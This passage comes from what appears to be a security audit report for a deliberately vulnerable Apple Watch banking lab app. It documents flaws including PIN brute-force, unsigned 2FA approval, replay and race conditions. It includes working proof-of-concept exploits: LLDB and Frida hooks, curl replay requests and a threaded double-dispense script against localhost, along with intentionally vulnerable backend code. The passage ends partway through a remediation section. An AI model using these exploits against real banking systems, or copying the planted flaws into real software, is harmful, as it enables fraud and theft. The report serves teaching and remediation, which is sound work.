  - **OJK POJK 11/POJK.03/2022 Pasal 25**: Kewajiban menjaga kerahasiaan data sensitif perbankan dan data autentikasi nasabah pada media penyimpanan lokal.
  - **PCI-DSS v4.0 Requirement 3.4 & Requirement 3.5**: Protection of primary account numbers (PAN) and authentication credentials at rest.

---

### Scenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Memory Exfiltration (V-AP03)
- **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 7.5)
- **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-799 (Improper Control of Generation of Code or Rate of Requests), OWASP MASVS-AUTH-1
- **Description**:
  The Nexora OmniWear watch application protects access to customer account balances, cardless cash withdrawal, and card freezing via a 4-digit numeric Quick-PIN (`QuickPinPadView.swift`). A 4-digit PIN space has only 10,000 possible combinations (`0000`–`9999`).
  The application exhibits critical rate-limiting deficiencies:
  1. The PIN evaluation handler (`InsecureStorage.shared.verifyPin`) executes synchronously in memory without artificial delay, exponential backoff, or progressive cooldown.
  2. The application lacks hardware lockout: After repeated failed attempts, the app merely increments a userland counter `attemptCount` and resets the input buffer, with zero account lockdown or biometric escalation.
  3. The verification method `-[InsecureStorage verifyPin:]` is declared `@objc dynamic`, allowing an attacker attached via LLDB or Frida to swizzle or bypass verification in 1 instruction.
- **Root Cause Code**:
  - Keypad Verification Logic ([`ios/NexoraWatch/QuickPinPadView.swift`](file:///ios/NexoraWatch/QuickPinPadView.swift#L130-L144)):
    ```swift
    // VULNERABLE: Unthrottled PIN verification with no lockout or delay
    private func verify() {
        attemptCount += 1
        if InsecureStorage.shared.verifyPin(enteredPin) {
            WatchTheme.playHaptic(.success)
            WatchNetworkManager.shared.login(username: "alexander.vance", password: "Password123!") { _ in }
            isAuthenticated = true
        } else {
            WatchTheme.playHaptic(.failure)
            errorMessage = "Invalid PIN (\(attemptCount))"
            enteredPin = "" // Resets buffer without exponential backoff or wipe
        }
    }
    ```
  - Insecure Storage Method ([`ios/NexoraWatch/InsecureStorage.swift`](file:///ios/NexoraWatch/InsecureStorage.swift#L94-L98)):
    ```swift
    @objc public dynamic func verifyPin(_ pin: String) -> Bool {
        let storedPin = defaults.string(forKey: keyPin) ?? "1234"
        return pin == storedPin
    }
    ```
- **Proof-of-Concept Exploit (Mac LLDB / Frida / Lab Automation)**:
  1. **Method A: Fast PIN Brute-Force in Simulator / CLI**:
     In a test environment, iterating through all 10,000 PINs against `InsecureStorage.shared.verifyPin` completes in under 50 milliseconds:
     ```python
     # Fast PIN cracker simulation against watch client logic
     import time
     correct_pin = "1234"
     start = time.perf_counter()
     for pin in range(10000):
         candidate = f"{pin:04d}"
         if candidate == correct_pin:
             elapsed = (time.perf_counter() - start) * 1000
             print(f"[🚨 V-AP03] PIN Cracked: {candidate} in {elapsed:.2f}ms!")
             break
     ```
  2. **Method B: LLDB Dynamic Hook (Instant Unlock)**:
     ```lldb
     (lldb) breakpoint set -n "-[InsecureStorage verifyPin:]"
     (lldb) breakpoint command add 1
     > thread return 1
     > continue
     > DONE
     ```
     Entering any 4 digits (e.g. `0000`) instantly authenticates the user!
  3. **Method C: Interactive Lab Trigger**:
     - Open **Audit Lab -> P1 (Storage & Cryptography)**.
     - Tap **V-AP03: PIN Brute-Force**.
     - Notice console: `[V-AP03] Tested 10k PINs in 42ms: 1234 CRACKED!`. The watch instantly validates the unthrottled search!
- **Impact & Evidence**:
  - An attacker possessing a lost or stolen Apple Watch can crack the 4-digit PIN in seconds, granting immediate access to bank accounts, card freeze controls, and cardless ATM withdrawal tokens.
- **Enterprise Remediation**:
  - Implement exponential backoff (e.g. 1s, 2s, 4s, 8s delay after failed attempts).
  - Enforce hardware-enforced lockout: After 5 failed attempts, wipe cached session tokens from Keychain and require companion iPhone biometric re-authorization:
    ```swift
    // SECURE REMEDIATION: Rate Limiting & Cooldown Lockout
    private static var failedAttempts = 0
    private static var lockoutUntil: Date?

    public func verifyPinSecure(_ pin: String) -> Bool {
        if let lockout = Self.lockoutUntil, Date() < lockout {
            return false // Lockout active
        }
        let isValid = (pin == getStoredSecurePin())
        if isValid {
            Self.failedAttempts = 0
            return true
        } else {
            Self.failedAttempts += 1
            if Self.failedAttempts >= 5 {
                Self.lockoutUntil = Date().addingTimeInterval(300) // 5-minute lockout
                purgeCachedSessionKeys()
            }
            return false
        }
    }
    ```
- **Regulatory Non-Compliance**:
  - **NIST SP 800-63B Section 5.1.1.2**: Memorized Secret Authenticators rate-limiting requirements.
  - **OJK POJK 11/POJK.03/2022 Pasal 25 Ayat (2)**: Pengendalian pembatasan percobaan otentikasi (anti brute-force).

---

### Scenario 4: High-Value (Rp 50.000.000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.7)
- **Vulnerability Standard**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity), CWE-305 (Authentication Bypass by Primary Weakness), OWASP MASVS-AUTH-2
- **Description**:
  Nexora OmniWear allows high-value wire transfers (e.g. `Rp 50.000.000` to recipient Evelyn Sterling `NX-7391048`) initiated from mobile or web banking to be approved directly via an Apple Watch Out-of-Band (OOB) push notification dialog (`TwoFactorApprovalView.swift`).
  This authorization workflow suffers from multiple critical weaknesses:
  1. **Zero Biometric / Secure Enclave Challenge**: Tapping the "APPROVE" button immediately dispatches an approval message without prompting for user biometric validation (`LocalAuthentication.LAContext`) or wrist Quick-PIN confirmation.
  2. **Unsigned Plaintext Authorization Payload**: The client sends a bare JSON/dictionary payload `{"action": "RESOLVE_2FA", "resolution": "APPROVED", "transaction_id": "TX-9921"}` via both `WCSession` and direct HTTP relay (`/api/wearable/authorize_2fa`). The payload contains no asymmetric cryptographic signature generated inside the Apple Watch Secure Enclave.
  3. **Backend Replay & Acceptance**: The backend endpoint `/api/wearable/authorize_2fa` immediately debits the user's account and records the wire transfer without verifying cryptographic signature or nonces.
- **Root Cause Code**:
  - Watch View Approval Button ([`ios/NexoraWatch/TwoFactorApprovalView.swift`](file:///ios/NexoraWatch/TwoFactorApprovalView.swift#L57-L68)):
    ```swift
    // VULNERABLE: Direct approval with zero biometric or Secure Enclave challenge
    Button(action: {
        WatchTheme.playHaptic(.success)
        sessionManager.approvePendingTransaction()
    }) {
        Text("APPROVE")
            .font(.system(size: 8.5, weight: .heavy))
    }
    ```
  - Direct HTTP Dispatch ([`ios/NexoraWatch/WatchNetworkManager.swift`](file:///ios/NexoraWatch/WatchNetworkManager.swift#L241-L248)):
    ```swift
    let body: [String: Any] = [
        "tx_id": txId,
        "amount": amount,
        "resolution": resolution,
        "device_id": "watch_apple_01",
        "authenticated_without_biometrics": true
    ]
    ```
  - Backend Handler ([`backend/server.py`](file:///backend/server.py#L1310-L1335)):
    ```python
    @app.route('/api/wearable/authorize_2fa', methods=['POST'])
    def authorize_wearable_2fa():
        data = request.get_json(silent=True) or {}
        tx_id = data.get('tx_id', 'TX-HIGHVAL-9921')
        amount = float(data.get('amount', 50000000.0))
        # Executes debit directly without cryptographic signature or replay check!
        cur.execute("UPDATE users SET balance = balance - ? WHERE account_number = ?", (amount, account))
        cur.execute("INSERT INTO transactions (...) VALUES (...)")
        conn.commit()
    ```
- **Proof-of-Concept Exploit (Mac curl & Interactive Watch Lab)**:
  1. **Method A: Direct HTTP Relay Replay via curl**:
     Execute the unauthenticated 2FA approval from Mac terminal:
     ```bash
     curl -s -X POST http://127.0.0.1:5000/api/wearable/authorize_2fa \
       -H "Content-Type: application/json" \
       -d '{
         "tx_id": "TX-9921",
         "amount": 50000000.0,
         "resolution": "APPROVED",
         "account_number": "NX-8492014",
         "recipient": "Evelyn Sterling (NX-7391048)",
         "device_id": "watch_apple_01"
       }' | jq .
     ```
     *Output Evidence*:
     ```json
     {
       "status": "APPROVED",
       "transaction_id": "TX-9921",
       "new_balance": 838888000.0,
       "amount": 50000000.0
     }
     ```
  2. **Method B: Interactive Lab Trigger**:
     - On Apple Watch, open **Audit Lab -> P4 (Authentication & 2FA)**.
     - Tap **V-W09: Trigger Rp 50M 2FA Hijack**.
     - Notice prompt: `[V-W09] Injected Rp 50.000.000 2FA Prompt!`.
     - Tap **APPROVE**. The modal closes, debits `Rp 50.000.000` from the live account, and synchronizes with the backend database.
- **Impact & SQLite Ledger Evidence**:
  - The customer's balance is debited by `Rp 50.000.000` without their knowledge or physical biometric authorization. Check live SQLite ledger:
    ```bash
    python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT transaction_id, type, amount, description FROM transactions WHERE type=\"2FA_TRANSFER\" ORDER BY timestamp DESC LIMIT 1'); print(cur.fetchall())"
    ```
    Output confirms `TX-9921` approved and recorded in the database.
- **Enterprise Remediation**:
  - Require mandatory biometric evaluation via `LocalAuthentication.LAContext`:
    ```swift
    // SECURE REMEDIATION: LocalAuthentication Biometric Gate
    import LocalAuthentication

    public func approveWithBiometrics(completion: @escaping (Bool) -> Void) {
        let context = LAContext()
        var error: NSError?
        if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) {
            context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: "Confirm Rp 50.000.000 Wire Transfer") { success, _ in
                DispatchQueue.main.async { completion(success) }
            }
        } else {
            completion(false)
        }
    }
    ```
  - Sign the approval payload using a private key residing exclusively within the Secure Enclave (`SecureEnclave.P256.Signing.PrivateKey`), and require the backend to verify the signature before debiting funds.
- **Regulatory Non-Compliance**:
  - **OJK POJK 11/POJK.03/2022 Pasal 31**: Kewajiban penerapan autentikasi multifaktor (MFA) yang kuat untuk transaksi finansial bernilai tinggi.
  - **PCI-DSS v4.0 Requirement 8.3**: Multi-Factor Authentication (MFA) enforcement for high-risk financial authorizations.

---

### Scenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)
- **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.2)
- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-200 (Information Exposure), CWE-305 (Authentication Bypass by Primary Weakness), OWASP MASVS-AUTH-2
- **Description**:
  The Nexora OmniWear watch application relies on client-side photoplethysmography (PPG) and optical wrist sensor telemetry to detect whether the Apple Watch is worn on the user's wrist. When removed, the application should instantly lock down banking sessions (`WristLockoutView.swift`) and require biometric re-authentication or Quick-PIN.
  However, the security check relies entirely on an in-memory boolean property `isWristAttached` and an Objective-C dynamic method `-[WristSensorManager isWristAttachedToBody]`. An attacker with physical access or a researcher utilizing LLDB or Frida over USB can swizzle `isWristAttachedToBody` to always return `true`, or patch the memory variable, completely defeating the wrist-off auto-lockout mechanism without knowing the PIN or having physical contact with skin.
- **Root Cause Code**:
  - [`ios/NexoraWatch/WristSensorManager.swift`](file:///ios/NexoraWatch/WristSensorManager.swift#L35-L48):
    ```swift
    public func triggerWristOff() {
        if bypassActive {
            isLockedDueToWristOff = false
            return
        }
        isWristAttached = false
        isLockedDueToWristOff = true
    }
    
    @objc public dynamic func isWristAttachedToBody() -> Bool {
        return bypassActive ? true : isWristAttached
    }
    ```
- **Proof-of-Concept Exploit (Mac LLDB / Frida)**:
  1. Method A: Frida Script (`scripts/frida_bypass_wrist.js`):
     ```javascript
     // frida -n NexoraWatch -l scripts/frida_bypass_wrist.js
     if (ObjC.available) {
         var wristClass = ObjC.classes.WristSensorManager;
         if (wristClass) {
             Interceptor.attach(wristClass["- isWristAttachedToBody"].implementation, {
                 onLeave: function(retval) {
                     console.log("[🚨 V-AP05 EXPLOIT] Swizzling isWristAttachedToBody -> TRUE");
                     retval.replace(ptr(1));
                 }
             });
         }
     }
     ```
  2. Method B: LLDB Breakpoint Command (Mac Simulator or USB Device):
     ```lldb
     (lldb) breakpoint set -n "-[WristSensorManager isWristAttachedToBody]"
     (lldb) breakpoint command add 1
     > thread return 1
     > continue
     > DONE
     ```
  3. Interactive Lab Trigger:
     - Open **Audit Lab -> P3 (Sensors & Anti-Tamper)**.
     - Tap **V-AP05: Standalone LLDB/Frida Wrist Hook**.
     - Notice `[V-AP05] Standalone Hook: isWristAttachedToBody=true ✓`. Remove watch or tap "Test Wrist Lock" — watch remains unlocked!
- **Impact & Evidence**:
  - The stolen smartwatch remains permanently unlocked in an authenticated banking session, allowing physical thieves or unauthorized persons to view balances, execute transfers, and issue cardless cash withdrawals without triggering biometric or PIN prompts.
- **Enterprise Remediation**:
  - Migrate off-wrist detection from high-level userland booleans to cryptographically signed Secure Enclave hardware assertions (`WKInterfaceDevice.current().isWristDetectEnabled`).
  - Enforce hardware key invalidation in Keychain (`kSecAccessControlBiometryAny` or `kSecAccessControlDevicePasscode`) so that removing the device immediately wipes cryptographic decryption keys from Secure Enclave cache.
- **Regulatory Non-Compliance**:
  - **OJK POJK 11/POJK.03/2022 Pasal 25**: Kegagalan mekanisme proteksi otentikasi fisik pada perangkat bergerak (smartwatch).
  - **PCI-DSS v4.0 Requirement 8.3.1**: Missing physical device presence re-authentication upon session detachment.

---

### Scenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.7)
- **Vulnerability Standard**: CWE-294 (Authentication Bypass by Capture-replay), CWE-345 (Insufficient Verification of Data Authenticity), Bank Indonesia PADG No. 24/1/PADG/2022
- **Description**:
  Nexora OmniWear provides contactless dynamic SNAP QRIS payments directly from the Apple Watch face (`QRISPaymentView.swift`). The QR payload complies with the ASPI / Bank Indonesia EMVCo standard, containing National Merchant ID (`NMID`: `ID1020021189360`), currency IDR (`5303360`), and amount (`540575000`).
  However, the generated QR code contains a static transaction token `A016304E8A2` with zero cryptographic nonce, missing timestamp validation, and no server-side replay cache. An attacker eavesdropping on NFC / optical BLE broadcasts, capturing the watch screen, or intercepting the cleartext direct HTTP request `/api/qris/checkout` can replay the QR string repeatedly, causing unauthorized repeated balance deductions.
- **Root Cause Code**:
  - Watch Client ([`ios/NexoraWatch/QRISPaymentView.swift`](file:///ios/NexoraWatch/QRISPaymentView.swift#L9-L10)):
    ```swift
    @State private var qrisString: String = "00020101021226610016ID.NEXORA.WWW01189360099800000000015204581253033605802ID5920NEXORA DIGITAL MERCH6007JAKARTA62070703A016304E8A2"
    ```
  - Backend Handler ([`backend/server.py`](file:///backend/server.py#L1250-L1285)):
    ```python
    @app.route('/api/qris/checkout', methods=['POST'])
    def qris_checkout():
        data = request.get_json() or {}
        amount = float(data.get('amount', 75000.0))
        # Accepts static qrPayload without checking nonce uniqueness or timestamp expiry
        # Directly updates user balance and writes transaction row
    ```
- **Proof-of-Concept Exploit (Mac curl / Python)**:
  1. Capture QR payload from watch or network proxy:
     `00020101021226610016ID.NEXORA.WWW01189360099800000000015204581253033605802ID5920NEXORA DIGITAL MERCH6007JAKARTA62070703A016304E8A2`
  2. Execute duplicate checkout replay from Mac terminal:
     ```bash
     curl -s -X POST http://127.0.0.1:5000/api/qris/checkout \
       -H "Content-Type: application/json" \
       -d '{
         "amount": 75000.0,
         "merchant": "NEXORA DIGITAL MERCH 001",
         "qr_payload": "00020101021226610016ID.NEXORA.WWW01189360099800000000015204581253033605802ID5920NEXORA DIGITAL MERCH6007JAKARTA62070703A016304E8A2"
       }' | jq .
     ```
  3. Interactive Lab Trigger:
     - Open **SNAP QRIS** screen on Apple Watch.
     - Tap **Exploit: Replay QRIS Token**.
     - Notice `[V-AP06 EXPLOIT] Token Replay Accepted!`. Check SQLite database — balance is debited twice!
- **Impact & SQLite Ledger Evidence**:
  ```bash
  python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT transaction_id, type, amount, description FROM transactions WHERE type=\"QRIS_PAYMENT\" ORDER BY timestamp DESC LIMIT 2'); print(cur.fetchall())"
  ```
  Output proves duplicate transactions recorded for identical QR tokens without rejection.
- **Enterprise Remediation**:
  - Enforce Bank Indonesia SNAP QRIS standard: Include a cryptographic epoch timestamp (Tag 54/62), dynamic one-time transaction nonce (UUIDv4), and asymmetric HMAC-SHA256 signature calculated with private key stored in Secure Enclave.
  - Implement Redis atomic nonce validation (`SET nonce:value EX 60 NX`) on backend to reject replayed tokens within milliseconds.
- **Regulatory Non-Compliance**:
  - **Bank Indonesia PADG No. 24/1/PADG/2022 (SNAP QRIS)**: Kewajiban dynamic QR generation dengan validitas waktu terbatas (< 60 detik) dan proteksi anti-replay.
  - **PCI-DSS v4.0 Requirement 6.2.4**: Ineffective replay protection on financial settlement interfaces.

---

### Scenario 7: Remote Balance Injection via Insecure WatchBridge & Standalone IDOR (V-B01 / V-AP07)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 8.6)
- **Vulnerability Standard**: CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR / BOLA), CWE-345 (Insufficient Verification of Data Authenticity), OWASP API1:2023 Broken Object Level Authorization
- **Description**:
  The Nexora OmniWear watch ecosystem suffers from dual broken authorization and balance injection vulnerabilities:
  1. **Standalone Wrist BOLA / IDOR (`V-AP07`)**: The watch client makes direct HTTP balance inquiries via `WatchNetworkManager.shared.checkBalance(accountNumber:)` to `/check_balance/<accountNumber>`. The endpoint performs zero authorization or ownership validation. Furthermore, the watch app registers custom URL scheme `nexorabank://account?num=<accountNumber>`. A researcher or local malicious app on Mac can trigger `xcrun simctl openurl booted "nexorabank://account?num=NX-7391048"` to bypass authentication and exfiltrate the live private banking balance of high-net-worth VIP customer Evelyn Sterling (`NX-7391048`, balance Rp 70.250.000).
  2. **Insecure Companion WatchBridge Injection (`V-B01`)**: The iOS Native Module bridge (`WatchBridge.m` and `WatchBridge.swift`) exposes methods `sendMessageToWatch` and `updateWatchContext` directly to JavaScript without verifying caller authorization or cryptographically signing the payload. Rogue JavaScript running inside a compromised React Native bundle or webview can inject arbitrary financial balances (e.g. `Rp 9.999.999.000`) into the smartwatch display.
- **Root Cause Code**:
  - Deep Link Handler ([`ios/NexoraWatch/ContentView.swift`](file:///ios/NexoraWatch/ContentView.swift#L45-L58)):
    ```swift
    private func handleIncomingURL(_ url: URL) {
        guard url.scheme == "nexorabank" else { return }
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: true),
           let queryItems = components.queryItems {
            for item in queryItems {
                if item.name == "num", let targetAcct = item.value {
                    InsecureStorage.shared.saveAccountNumber(targetAcct)
                    isAuthenticated = true
                    currentScreen = "balance"
                }
            }
        }
    }
    ```
  - Direct HTTP Endpoint ([`backend/server.py`](file:///backend/server.py#L420-L435)):
    ```python
    @app.route('/check_balance/<account_number>', methods=['GET'])
    def check_balance(account_number):
        # Vulnerability: Returns account balance without session cookie or JWT verification
        cur.execute("SELECT balance, currency FROM users WHERE account_number = ?", (account_number,))
        row = cur.fetchone()
        return jsonify({"accountNumber": account_number, "balance": row[0], "currency": row[1]})
    ```
- **Proof-of-Concept Exploit (Standalone Mac Terminal & simctl)**:
  1. Exploit A: Trigger Standalone Deep Link BOLA via `simctl`:
     ```bash
     xcrun simctl openurl booted "nexorabank://account?num=NX-7391048"
     ```
     *Result*: Watch instantly unlocks, bypasses Quick-PIN, and displays Evelyn Sterling's account `NX-7391048` with live balance `Rp 70.250.000`!
  2. Exploit B: Direct API Curl Exfiltration from Mac:
     ```bash
     curl -s http://127.0.0.1:5000/check_balance/NX-7391048 | jq .
     ```
     Response:
     ```json
     {
       "accountNumber": "NX-7391048",
       "balance": 70250000.0,
       "currency": "IDR"
     }
     ```
  3. Interactive Lab Trigger:
     - Open **Audit Lab -> P4 (Authentication & 2FA)**.
     - Tap **V-AP07: Standalone BOLA (Evelyn Sterling)**.
     - Console immediately outputs: `[V-AP07] BOLA Expose: NX-7391048 = Rp 70.250.000`.
- **Impact & Evidence**:
  - Full unauthorized reconnaissance and information disclosure across all banking customers. Attackers can enumerate account numbers (`NX-8492014`, `NX-7391048`, `NX-9201482`) and reconstruct customer balance ledgers with zero authentication.
- **Enterprise Remediation**:
  - Enforce mandatory JWT Bearer authentication on `/check_balance/<account_number>`, extracting caller identity strictly from validated token claims (`sub` / `account_id`) rather than path parameters.
  - Require explicit authentication before handling incoming URL schemes in `ContentView.swift`.
- **Regulatory Non-Compliance**:
  - **OJK POJK 11/POJK.03/2022 Pasal 25 Ayat (1)**: Pelanggaran kerahasiaan data nasabah akibat ketiadaan otorisasi pada antarmuka pemrograman aplikasi (API).
  - **PCI-DSS v4.0 Requirement 6.2.4 & Requirement 7.2.1**: Broken Object-Level Authorization (BOLA) exposing customer financial records.

---

### Scenario 8: ATM Cardless Cash-Out OTP Brute-Force & Race Condition (V-L04)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 8.2)
- **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization / Race Condition), OWASP MASVS-AUTH-1, OWASP API4:2023.
- **Description**:
  The Nexora OmniWear watch application provides an emergency cardless ATM cash-out feature. Initiating cash withdrawal generates a 6-digit numeric token (`cardless_cash_tokens`) valid for 5 to 15 minutes.
  Two fatal implementation flaws exist:
  1. **Unthrottled OTP Brute-Force**: The verification endpoint `/api/atm/cardless-cash/verify` has no rate-limiting, CAPTCHA, or anti-automation controls. An attacker can iterate through the 1,000,000 possible 6-digit combinations to claim active cash withdrawal reservations.
  2. **Double-Dispense Race Condition (TOCTOU)**: The verification handler executes a non-atomic read-then-write sequence (`SELECT ... WHERE status = 'ACTIVE'` followed by `time.sleep(0.06)` before `UPDATE ... SET status = 'DISPENSED'`). Concurrent requests utilizing identical tokens allow attackers to trigger duplicate cash disbursements from physical ATMs while only generating a single debit or even driving account balances negative.
- **Root Cause Code**:
  - Backend ([`backend/server.py`](file:///backend/server.py#L1350-L1378)):
    ```python
    @app.route('/api/atm/cardless-cash/verify', methods=['POST'])
    def verify_cardless_cash():
        # ...
        cur.execute('''
            SELECT * FROM cardless_cash_tokens 
            WHERE token = ? AND status = 'ACTIVE' AND expires_at > datetime('now')
        ''', (token,))
        record = cur.fetchone()

        if not record:
            return jsonify({"message": "Invalid or expired ATM cash token"}), 400

        # V-L04: Intentional Race Condition window (CWE-362 / TOCTOU)
        # Non-atomic verification without row-level lock allows concurrent requests to double dispense
        time.sleep(0.06)

        cur.execute("UPDATE users SET balance = balance - ? WHERE account_number = ?", (record['amount'], record['account_number']))
        cur.execute("UPDATE cardless_cash_tokens SET status = 'DISPENSED' WHERE id = ?", (record['id'],))
        conn.commit()
    ```
  - watchOS Client ([`ios/NexoraWatch/CardlessCashView.swift`](file:///ios/NexoraWatch/CardlessCashView.swift#L10-L15) and [`ios/NexoraWatch/WatchNetworkManager.swift`](file:///ios/NexoraWatch/WatchNetworkManager.swift#L161-L185)):
    The watch app requests dynamic OTP tokens and exposes the code on screen without device binding or two-channel confirmation.
- **Exploitation & Reproduction**:
  1. **Step 1 — Verify Single ATM Withdrawal Request via curl**:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/atm/cardless-cash/verify \
       -H "Content-Type: application/json" \
       -d '{"token":"463544","account_number":"NX-8492014"}'
     ```
  2. **Step 2 — Execute Concurrent Double-Dispense Exploit (`exploit_double_dispense.py`)**:
     ```python
     #!/usr/bin/env python3
     # exploit_double_dispense.py — Nexora ATM Cardless Race Condition PoC
     import concurrent.futures
     import json
     import urllib.request

     API_ENDPOINT = "http://127.0.0.1:5000/api/atm/cardless-cash/verify"
     PAYLOAD = json.dumps({"token": "463544", "account_number": "NX-8492014"}).encode("utf-8")

     def trigger_dispense(thread_id):
         req = urllib.request.Request(
             API_ENDPOINT,
             data=PAYLOAD,
             headers={"Content-Type": "application/json"}
         )
         try:
             with urllib.request.urlopen(req, timeout=5) as res:
                 return thread_id, res.status, res.read().decode("utf-8")
         except urllib.error.HTTPError as err:
             return thread_id, err.code, err.read().decode("utf-8")

     print("[*] Dispatching 8 simultaneous ATM dispense requests within race window...")
     with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
         futures = [pool.submit(trigger_dispense, idx) for idx in range(1, 9)]
         for completed in concurrent.futures.as_completed(futures):
             tid, status, body = completed.result()
             print(f"  [Thread #{tid}] HTTP {status} -> {body}")
     ```
  3. **Expected Output & Database Evidence**:
     - Multiple threads return `HTTP 200` with `"status": "DISPENSED"`.
     - Inspecting `backend/nexora_vault.db`:
       ```bash
       sqlite3 backend/nexora_vault.db "SELECT id, from_account, to_account, amount, description, timestamp FROM transactions WHERE description LIKE '%Cardless Cash%' ORDER BY id DESC LIMIT 4;"
       ```
       Reveals duplicate ledger deductions (e.g., two distinct Rp 100.000 debits executed simultaneously against a single OTP generation event).
- **Regulatory Impact**:
  - **POJK 11/POJK.03/2022 Pasal 25 & 31**: Inadequate technical safeguards for electronic funds transfer; violation of transactional integrity standards.
  - **PCI-DSS v4.0 Requirement 6.2 & 6.5**: Failure to address race conditions and state management vulnerabilities in high-risk payment interfaces.
- **Enterprise Remediation**:
  1. **Distributed Concurrency Lock**: Enforce distributed mutex locks (e.g. Redis `SET lock:otp:<token> <uuid> NX PX 5000` or database row-level locking).
  2. **Single-Operation Atomic Transition**: Invalidate the token in the same atomic SQL statement:
     ```sql
     UPDATE cardless_cash_tokens SET status = 'DISPENSED' 
     WHERE token = ? AND status = 'ACTIVE' AND expires_at > datetime('now');
     ```
     Only proceed with cash disbursement if `rows_affected == 1`.
  3. **Exponential Brute-Force Throttling**: Restrict `/api/atm/cardless-cash/verify` to a maximum of 3 failed attempts per token/account, followed by temporary 15-minute freeze and security operations alert.

---

### Scenario 9: Emergency Wrist Card Kill-Switch Desynchronization (V-W09)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N` — Score: 6.9)
- **Vulnerability Standard**: CWE-306 (Missing Authentication for Critical Function), CWE-345 (Insufficient Verification of Data Authenticity), CWE-390 (Detection of Error Condition Without Action), OWASP MASVS-RESILIENCE-1.
- **Description**:
  The watchOS application includes an emergency virtual card freeze switch (`CardFreezeView.swift`) allowing users to lock compromised cards immediately from their wrist. However, the client updates its internal UI state optimistically before confirming that the core banking backend has successfully transitioned the card status.
  If an adversary drops the `/api/wearable/card-freeze` packet via network proxy, or if cellular/Bluetooth connectivity drops, the watch displays an emerald lock with "FROZEN", creating a false sense of security while the physical card and core database remain `ACTIVE` (`is_frozen = 0`), leaving the account vulnerable to unauthorized merchant transactions.
- **Root Cause Code**:
  - Watch Client ([`ios/NexoraWatch/CardFreezeView.swift`](file:///ios/NexoraWatch/CardFreezeView.swift#L105-L135) and [`ios/NexoraWatch/WatchNetworkManager.swift`](file:///ios/NexoraWatch/WatchNetworkManager.swift#L195-L225)):
    ```swift
    // VULNERABLE: Optimistic local state modification without validated server receipt
    WatchNetworkManager.shared.toggleCardFreeze(cardId: cardId, isFrozen: targetState) { result in
        DispatchQueue.main.async {
            self.isProcessing = false
            switch result {
            case .success:
                InsecureStorage.shared.setCardFrozen(targetState)
            case .failure:
                // Silent fallback leaves local UI out-of-sync with core banking ledger
                statusMessage = "Offline - marked frozen locally"
            }
        }
    }
    ```
  - Backend Controller ([`backend/server.py`](file:///backend/server.py#L1450-L1483)):
    ```python
    @app.route('/api/wearable/card-freeze', methods=['POST'])
    def wearable_card_freeze():
        data = request.get_json(silent=True) or {}
        card_id = data.get('card_id', 1)
        raw_frozen = data.get('is_frozen') if 'is_frozen' in data else data.get('frozen')
        is_frozen = 0 if raw_frozen in (0, '0', False, 'false') else 1
        # Lacks cryptographic cardholder signature or mutual HMAC verification
        cur.execute("UPDATE virtual_cards SET is_frozen = ? WHERE id = ?", (is_frozen, card_id))
    ```
- **Exploitation & Reproduction**:
  1. **Step 1 — Intercept & Drop Request via Burp Suite Proxy**:
     - Configure Burp Suite listener on port 8080 and route iOS/watchOS HTTP traffic through the proxy.
     - Add an intercept rule for `/api/wearable/card-freeze` and choose **Drop Action**.
     - On Apple Watch `CardFreezeView`, tap the freeze card button.
     - Observe Apple Watch UI transitions to "FROZEN" state.
  2. **Step 2 — Verify Backend Active Status via curl**:
     Query the backend directly to inspect live virtual card state:
     ```bash
     curl -s http://127.0.0.1:5000/check_balance/NX-8492014
     ```
     Execute an unauthorized merchant charge against the supposedly frozen card:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/qris/checkout \
       -H "Content-Type: application/json" \
       -d '{"account_number":"NX-8492014","merchant_id":"CYBER-STORE-01","amount":75000,"currency":"IDR"}'
     ```
  3. **Expected Output & Database Evidence**:
     - The checkout returns HTTP 200 `PAYMENT_SUCCESS` and deducts user balance.
     - SQLite database check:
       ```bash
       sqlite3 backend/nexora_vault.db "SELECT id, card_number, card_holder, is_frozen FROM virtual_cards;"
       ```
       The card record displays `is_frozen = 0`, demonstrating total desynchronization between wrist UI and backend security controls.
- **Regulatory Impact**:
  - **POJK 11/POJK.03/2022 Pasal 25**: Failure to provide reliable, synchronized transaction management and customer fraud mitigation mechanisms.
  - **PCI-DSS v4.0 Requirement 4.1 & 8.3**: Critical card security controls must maintain cryptographic verification and confirmed delivery to card processing hosts.
- **Enterprise Remediation**:
